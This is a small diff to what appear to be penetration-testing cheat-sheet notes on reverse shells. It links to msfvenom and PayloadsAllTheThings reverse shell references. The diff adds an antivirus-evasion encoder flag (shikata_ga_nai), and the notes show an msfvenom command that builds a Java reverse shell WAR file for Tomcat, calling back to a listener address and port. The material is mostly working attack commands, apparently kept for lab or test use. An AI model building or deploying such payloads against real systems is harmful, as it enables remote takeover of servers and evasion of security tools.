@@ -4,6 +4,7 @@ https://infinitelogins.com/2020/01/25/msfvenom-reverse-shell-payload-cheatsheet/
 https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#powershell
 
 ## INITIAL ENTRY 
+-e x86/shikata_ga_nai
 ````
 JSP / tomcat WAR 
 msfvenom -p java/shell_reverse_tcp LHOST=10.10.10.1 LPORT=4444 -f war > java4444.war  
